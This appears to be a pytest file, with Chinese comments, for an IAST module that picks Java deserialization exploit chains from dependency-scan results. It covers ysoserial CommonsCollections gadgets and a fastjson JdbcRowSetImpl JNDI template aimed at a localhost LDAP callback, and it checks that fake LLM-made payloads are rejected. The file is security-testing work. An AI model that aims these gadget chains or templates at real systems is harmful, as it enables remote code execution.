"""SCA 驱动选弹测试（方案 C：弹药库 + LLM 兜底；方案 D：ysoserial 集成）。

最要紧的一条是 test_llm_fabricated_payload_rejected：
LLM 造的「序列化字节」几乎不可能是合法 Java 序列化流，若不经自检就登记，
D1 会把废字节投出去得到假阴性——比老实降级更有害。这里锁死自检必须是硬门槛。
"""
import base64
import json
import os

import pytest

from src.iast.payload_forge import (
    PayloadForge,
    _run_ysoserial,
    version_in_range,
    _JAR_PATH,
)
from src.iast import gadget_builder as _gb


def _real_ysoserial_ready() -> bool:
    """真跑 ysoserial 需要本地 jar 与 JDK。

    jar 是第三方二进制，不随仓库分发；干净 clone / CI 上没有它时本条跳过，
    不把「环境缺依赖」误报成「选弹逻辑坏了」。
    """
    try:
        return os.path.isfile(str(_JAR_PATH)) and bool(_gb._resolve_java())
    except Exception:  # noqa: BLE001
        return False


needs_real_ysoserial = pytest.mark.skipif(
    not _real_ysoserial_ready(),
    reason="需要本地 ysoserial jar 与 JDK（第三方二进制不入库）",
)


# --------------------------------------------------------------------------- 版本范围


@pytest.mark.parametrize("version,spec,expected", [
    ("3.1", ">=3.1,<=3.2.1", True),
    ("3.2.1", ">=3.1,<=3.2.1", True),
    ("3.2.2", ">=3.1,<=3.2.1", False),
    ("4.0", ">=4.0,<=4.0", True),
    ("4.1", ">=4.0,<=4.0", False),
    ("1.2.24", "<=1.2.24", True),
    ("1.2.83", "<=1.2.24", False),
    ("1.2.47", ">=1.2.25,<=1.2.47", True),
    ("1.2.24", ">=1.2.25,<=1.2.47", False),
    ("2.0", "*", True),
    # qualifier 不参与比较：1.2.24.RELEASE 等价 1.2.24；1.2.3 确实早于 1.2.24（不是字典序的 "3" > "2"）
    ("1.2.24.RELEASE", "<=1.2.24", True),
    ("1.2.3.RELEASE", "<=1.2.24", True),
    ("1.2.25.RELEASE", "<=1.2.24", False),
    ("", "<=1.2.24", False),          # 版本不可解析 → 保守判不在范围内
    ("3.1", "", True),                 # 空 spec 视为不限
])
def test_version_in_range(version, spec, expected):
    assert version_in_range(version, spec) is expected


# --------------------------------------------------------------------------- 弹药库选链


def _forge(tmp_path, **kw):
    """造一个带假 jar 的 PayloadForge（runner 由测试注入，不会真跑 java）。"""
    jar = tmp_path / "ysoserial-all.jar"
    jar.write_bytes(b"fake")
    kw.setdefault("jar_path", str(jar))
    kw.setdefault("callback_base", "ldap://127.0.0.1:1389/sastai")
    return PayloadForge(**kw)


def test_select_chains_for_commons_collections_31(tmp_path):
    forge = _forge(tmp_path)
    chains = forge.select_chains({"name": "commons-collections:commons-collections",
                                  "version": "3.1", "ecosystem": "maven"},
                                 family="deserialization")
    assert chains
    assert chains[0]["id"] == "cc6"   # priority 最高
    ids = {c["id"] for c in chains}
    assert {"cc1", "cc3", "cc5", "cc6", "cc7"} <= ids


def test_select_chains_prefers_cc6_over_cc1(tmp_path):
    """CC1 依赖旧 JDK，优先级必须低于 CC6，否则新 JDK 上选到必然失效的链。"""
    forge = _forge(tmp_path)
    chains = forge.select_chains({"name": "commons-collections", "version": "3.2.1"},
                                 family="deserialization")
    assert chains[0]["payload_name"] == "CommonsCollections6"


def test_select_chains_for_commons_collections4(tmp_path):
    forge = _forge(tmp_path)
    chains = forge.select_chains({"name": "org.apache.commons:commons-collections4",
                                  "version": "4.0", "ecosystem": "maven"},
                                 family="deserialization")
    assert chains
    assert {c["id"] for c in chains} == {"cc2", "cc4"}


def test_select_chains_for_fastjson_uses_text_template(tmp_path):
    forge = _forge(tmp_path)
    chains = forge.select_chains({"name": "com.alibaba:fastjson", "version": "1.2.24",
                                  "ecosystem": "maven"}, family="deserialization")
    assert chains
    assert chains[0]["kind"] == "text"
    assert "JdbcRowSetImpl" in chains[0]["template"]


def test_select_chains_version_out_of_range_returns_empty(tmp_path):
    forge = _forge(tmp_path)
    chains = forge.select_chains({"name": "commons-collections", "version": "3.2.2"},
                                 family="deserialization")
    assert chains == []


def test_select_chains_unknown_package_returns_empty(tmp_path):
    forge = _forge(tmp_path)
    assert forge.select_chains({"name": "totally:unknown-lib", "version": "1.0"},
                               family="deserialization") == []


def test_select_chains_family_mismatch_returns_empty(tmp_path):
    """family 不匹配不能命中——否则 SQLi 会被送去投反序列化 gadget。"""
    forge = _forge(tmp_path)
    assert forge.select_chains({"name": "commons-collections", "version": "3.1"},
                               family="sqli") == []


# --------------------------------------------------------------------------- text 链造弹


def test_forge_text_replaces_callback(tmp_path):
    forge = _forge(tmp_path)
    chain = {"id": "fastjson-jdbcrowset", "kind": "text",
             "template": '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{callback}","autoCommit":true}'}
    payload = forge.forge(chain)
    assert payload is not None
    assert "{callback}" not in payload
    assert "ldap://127.0.0.1:1389/sastai" in payload
    json.loads(payload)   # 必须是合法 JSON


def test_forge_text_without_callback_base_leaves_no_placeholder(tmp_path):
    forge = _forge(tmp_path, callback_base="")
    chain = {"id": "t", "kind": "text", "template": '{"a":"{callback}"}'}
    payload = forge.forge(chain)
    assert payload is not None
    assert "{callback}" not in payload


def test_forge_text_missing_template_returns_none(tmp_path):
    forge = _forge(tmp_path)
    assert forge.forge({"id": "x", "kind": "text"}) is None


# --------------------------------------------------------------------------- ysoserial 链造弹（注入 runner）


def test_forge_ysoserial_base64_encodes_runner_output(tmp_path):
    raw = b"\xac\xed\x00\x05\x01\x02\x03"
    forge = _forge(tmp_path)
    captured = {}

    def runner(jar, name, cmd, timeout):
        captured.update(jar=jar, name=name, cmd=cmd)
        return raw

    payload = forge.forge({"id": "cc6", "kind": "ysoserial", "payload_name": "CommonsCollections6"},
                          command="ping -c 1 127.0.0.1", runner=runner)
    assert payload == base64.b64encode(raw).decode("ascii")
    assert captured["name"] == "CommonsCollections6"
    assert captured["cmd"] == "ping -c 1 127.0.0.1"


def test_forge_ysoserial_refuses_empty_command(tmp_path):
    """空命令的 gadget 打过去不产生可观测副作用，等同废弹，必须拒绝造。"""
    forge = _forge(tmp_path)
    calls = []

    def runner(jar, name, cmd, timeout):
        calls.append(cmd)
        return b"\xac\xed\x00\x05"

    payload = forge.forge({"id": "cc6", "kind": "ysoserial", "payload_name": "CommonsCollections6"},
                          command="", runner=runner)
    assert payload is None
    assert calls == []


def test_forge_ysoserial_missing_jar_returns_none(tmp_path):
    forge = PayloadForge(jar_path=str(tmp_path / "nope.jar"))
    assert forge.forge({"id": "cc6", "kind": "ysoserial", "payload_name": "CommonsCollections6"},
                       command="id") is None


def test_forge_ysoserial_runner_exception_returns_none(tmp_path):
    forge = _forge(tmp_path)

    def runner(*a, **k):
        raise RuntimeError("java boom")

    assert forge.forge({"id": "cc6", "kind": "ysoserial", "payload_name": "CC6"},
                       command="id", runner=runner) is None


# --------------------------------------------------------------------------- 自检（硬门槛）


def test_selfcheck_accepts_real_java_serialized_stream():
    raw = b"\xac\xed\x00\x05" + b"\x00" * 64
    assert PayloadForge.selfcheck(base64.b64encode(raw).decode(), "ysoserial") is True


def test_selfcheck_rejects_llm_style_fake_stream():
    """LLM 常直接吐一段 base64 文本（无魔数），必须被拒。"""
    fake = base64.b64encode(b"serialized_object_placeholder").decode()
    assert PayloadForge.selfcheck(fake, "ysoserial") is False


def test_selfcheck_rejects_non_base64():
    assert PayloadForge.selfcheck("not-base64!!!", "ysoserial") is False


def test_selfcheck_rejects_too_short_stream():
    assert PayloadForge.selfcheck(base64.b64encode(b"\xac\xed\x00\x05").decode(), "ysoserial") is False


def test_selfcheck_text_accepts_valid_json():
    assert PayloadForge.selfcheck('{"@type":"X","dataSourceName":"ldap://a/b"}', "text") is True


def test_selfcheck_text_rejects_unreplaced_placeholder():
    assert PayloadForge.selfcheck('{"dataSourceName":"{callback}"}', "text") is False


def test_selfcheck_text_rejects_invalid_json():
    assert PayloadForge.selfcheck("{'not':'json'}", "text") is False


# --------------------------------------------------------------------------- LLM 兜底


class _FakeGateway:
    def __init__(self, text):
        self.text = text
        self.prompts = []

    def complete(self, *, purpose="", prompt="", context=None, prompt_version="", **kwargs):
        # 与 ModelGateway.complete 的 keyword-only 签名对齐（purpose/prompt/context），
        # 否则 payload_forge 注入真实 gateway 时恒抛 TypeError 被 except 吞掉 → LLM 兜底腿永死。
        self.prompts.append(prompt)
        return self.text


def test_llm_fabricated_payload_rejected(tmp_path):
    """核心：LLM 造的假序列化流必须过不了自检，一个都不许登记。"""
    gw = _FakeGateway("base64(serialized_object)\nInvalidPayload123")
    forge = _forge(tmp_path, gateway=gw)
    out = forge.llm_forge({"name": "some:lib", "version": "1.0"}, family="deserialization")
    assert out == []


def test_llm_candidate_passing_selfcheck_is_accepted(tmp_path):
    raw = b"\xac\xed\x00\x05" + b"\x01" * 32
    gw = _FakeGateway(base64.b64encode(raw).decode())
    forge = _forge(tmp_path, gateway=gw)
    out = forge.llm_forge({"name": "some:lib", "version": "1.0"}, family="deserialization")
    assert len(out) == 1
    assert PayloadForge.selfcheck(out[0], "ysoserial") is True


def test_llm_forge_without_gateway_returns_empty(tmp_path):
    forge = _forge(tmp_path, gateway=None)
    assert forge.llm_forge({"name": "x:y", "version": "1.0"}) == []


def test_llm_forge_gateway_exception_returns_empty(tmp_path):
    class Boom:
        def complete(self, prompt):
            raise RuntimeError("llm down")

    forge = _forge(tmp_path, gateway=Boom())
    assert forge.llm_forge({"name": "x:y", "version": "1.0"}) == []


# --------------------------------------------------------------------------- 综合入口 forge_from_sca


def test_forge_from_sca_blocked_by_reachability(tmp_path):
    """可达性不过 → 即使弹药库有链也不许选弹（SCA 命中版本 ≠ 可利用）。"""
    forge = _forge(tmp_path, reachability_judge=lambda c, f, r: {
        "reachable": False, "classpath_hit": False, "entry_hit": False,
        "reason": "未在构建文件声明", "confidence": "low", "evidence": {},
    })
    out = forge.forge_from_sca([{"name": "commons-collections", "version": "3.1"}],
                               family="deserialization", command="id")
    assert out["payloads"] == []
    assert out["degraded"] is True
    assert out["source"] == "none"


def test_forge_from_sca_succeeds_when_reachable(tmp_path):
    forge = _forge(tmp_path, reachability_judge=lambda c, f, r: {
        "reachable": True, "classpath_hit": True, "entry_hit": True,
        "reason": "ok", "confidence": "high", "evidence": {},
    })

    def runner(jar, name, cmd, timeout):
        return b"\xac\xed\x00\x05" + b"\x09" * 64

    out = forge.forge_from_sca([{"name": "commons-collections", "version": "3.1"}],
                               family="deserialization", command="id", runner=runner)
    assert out["degraded"] is False
    assert out["source"] == "library"
    assert out["selected_chain"]["id"] == "cc6"
    assert len(out["payloads"]) == 1
    assert PayloadForge.selfcheck(out["payloads"][0], "ysoserial") is True


def test_forge_from_sca_falls_back_to_llm_for_unknown_lib(tmp_path):
    raw = b"\xac\xed\x00\x05" + b"\x02" * 64
    gw = _FakeGateway(base64.b64encode(raw).decode())
    forge = _forge(tmp_path, gateway=gw, reachability_judge=lambda c, f, r: {
        "reachable": True, "classpath_hit": True, "entry_hit": True,
        "reason": "ok", "confidence": "high", "evidence": {},
    })
    out = forge.forge_from_sca([{"name": "unknown:lib", "version": "9.9"}],
                               family="deserialization", command="id")
    assert out["degraded"] is False
    assert out["source"] == "llm"
    assert out["payloads"]


def test_forge_from_sca_no_components(tmp_path):
    forge = _forge(tmp_path)
    out = forge.forge_from_sca([], family="deserialization")
    assert out["degraded"] is True
    assert "无 SCA 组件输入" in out["reason"]


def test_forge_from_sca_discards_payload_failing_selfcheck(tmp_path):
    """造弹成功但自检不过 → 丢弃并继续降级，绝不放废弹出去。"""
    forge = _forge(tmp_path, reachability_judge=lambda c, f, r: {
        "reachable": True, "classpath_hit": True, "entry_hit": True,
        "reason": "ok", "confidence": "high", "evidence": {},
    })

    def runner(jar, name, cmd, timeout):
        return b"garbage-not-a-serialized-stream"

    out = forge.forge_from_sca([{"name": "commons-collections", "version": "3.1"}],
                               family="deserialization", command="id", runner=runner)
    assert out["payloads"] == []
    assert out["degraded"] is True


def test_forge_from_sca_text_chain_selected_for_fastjson(tmp_path):
    forge = _forge(tmp_path, reachability_judge=lambda c, f, r: {
        "reachable": True, "classpath_hit": True, "entry_hit": True,
        "reason": "ok", "confidence": "high", "evidence": {},
    })
    out = forge.forge_from_sca([{"name": "com.alibaba:fastjson", "version": "1.2.24"}],
                               family="deserialization")
    assert out["degraded"] is False
    assert out["source"] == "library"
    assert "JdbcRowSetImpl" in out["payloads"][0]


# --------------------------------------------------------------------------- 真实 ysoserial 集成（方案 D）


@pytest.mark.slow
@needs_real_ysoserial
def test_real_ysoserial_integration_produces_valid_payload():
    """端到端：真跑 tools/ysoserial-all.jar 生成 CC6，验证字节流合法。

    这条测试证明方案 D 的外部工具集成是真能用的，不是只写了调用代码。
    """
    raw = _run_ysoserial(str(PayloadForge().jar_path),
                         "CommonsCollections6", "ping -c 1 127.0.0.1", timeout=120)
    assert raw, "ysoserial 未产出字节流（jar 缺失或 java 不可用）"
    assert raw.startswith(b"\xac\xed\x00\x05")
    payload = base64.b64encode(raw).decode("ascii")
    assert PayloadForge.selfcheck(payload, "ysoserial") is True
